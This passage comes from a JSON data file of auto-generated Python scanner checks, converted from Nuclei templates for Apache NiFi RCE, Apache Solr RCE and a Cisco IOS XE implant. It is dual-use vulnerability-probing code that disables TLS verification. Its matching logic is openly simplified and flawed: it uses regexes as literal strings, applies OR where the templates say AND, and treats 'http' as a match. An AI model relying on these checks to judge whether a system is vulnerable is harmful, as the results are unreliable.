        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: apache-nifi-rce\nName: Apache NiFi - Remote Code Execution\nSeverity: critical\nDescription: Apache NiFi is designed for data streaming. It supports highly configurable data routing, transformation, and system mediation logic that indicate graphs. The system has unauthorized remote command execution vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_apache_nifi_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"apache-nifi-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache NiFi - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'revision, canRead, permissions' | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['revision, canRead, permissions', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache NiFi - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_apache_nifi_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: apache-nifi-rce\nName: Apache NiFi - Remote Code Execution\nSeverity: critical\nDescription: Apache NiFi is designed for data streaming. It supports highly configurable data routing, transformation, and system mediation logic that indicate graphs. The system has unauthorized remote command execution vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_apache_nifi_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"apache-nifi-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache NiFi - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'revision, canRead, permissions' | mot(s) 'application/json' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['revision, canRead, permissions', 'application/json']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache NiFi - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_apache_nifi_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "packetstorm",
          "apache",
          "nifi",
          "rce",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_apache_solr_rce",
        "name": "Apache Solr 9.1 - Remote Code Execution",
        "language": "Python",
        "famille": "WebApp",
        "description": "Apache Solr 9.1 is vulnerable to RCE.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'http' | mot(s) 'User-Agent: Java'",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: apache-solr-rce\nName: Apache Solr 9.1 - Remote Code Execution\nSeverity: critical\nDescription: Apache Solr 9.1 is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_apache_solr_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"apache-solr-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache Solr 9.1 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'User-Agent: Java'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'User-Agent: Java']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache Solr 9.1 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_apache_solr_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: apache-solr-rce\nName: Apache Solr 9.1 - Remote Code Execution\nSeverity: critical\nDescription: Apache Solr 9.1 is vulnerable to RCE.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_apache_solr_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"apache-solr-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"Apache Solr 9.1 - Remote Code Execution\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'User-Agent: Java'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'User-Agent: Java']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Apache Solr 9.1 - Remote Code Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_apache_solr_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "solr",
          "apache",
          "rce",
          "oast",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_cisco_implant_detect",
        "name": "Cisco IOS XE - Impant Detection",
        "language": "Python",
        "famille": "WebApp",
        "description": "Cisco is aware of active exploitation of a previously unknown vulnerability in the web UI feature of Cisco IOS XE Software when exposed to the internet or to untrusted networks. This vulnerability allows a remote, unauthenticated attacker to create an account on an affected system with privilege level 15 access. The attacker can then use that account to gain control of the affected system.",
        "severity": "critical",
        "detection": "[AND] regex ['webui-centerpanel-title'] | regex ['^([a-f0-9]{18})\\\\s*$'] | DSL: status_code_2 == 200",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: cisco-implant-detect\nName: Cisco IOS XE - Impant Detection\nSeverity: critical\nDescription: Cisco is aware of active exploitation of a previously unknown vulnerability in the web UI feature of Cisco IOS XE Software when exposed to the internet or to untrusted networks. This vulnerability allows a remote, unauthenticated attacker to create an account on an affected system with privilege level 15 access. The attacker can then use that account to gain control of the affected system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_cisco_implant_detect:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"cisco-implant-detect\"\n    SEVERITY = \"critical\"\n    NAME = \"Cisco IOS XE - Impant Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] regex ['webui-centerpanel-title'] | regex ['^([a-f0-9]{18})\\\\\\\\s*$'] | DSL: status_code_2 == 200\"\n\n        # Simple word matcher simulation\n        matchers = ['webui-centerpanel-title', '^([a-f0-9]{18})\\\\\\\\s*$']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Cisco IOS XE - Impant Detection\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_cisco_implant_detect(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: cisco-implant-detect\nName: Cisco IOS XE - Impant Detection\nSeverity: critical\nDescription: Cisco is aware of active exploitation of a previously unknown vulnerability in the web UI feature of Cisco IOS XE Software when exposed to the internet or to untrusted networks. This vulnerability allows a remote, unauthenticated attacker to create an account on an affected system with privilege level 15 access. The attacker can then use that account to gain control of the affected system.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_cisco_implant_detect:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"cisco-implant-detect\"\n    SEVERITY = \"critical\"\n    NAME = \"Cisco IOS XE - Impant Detection\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n   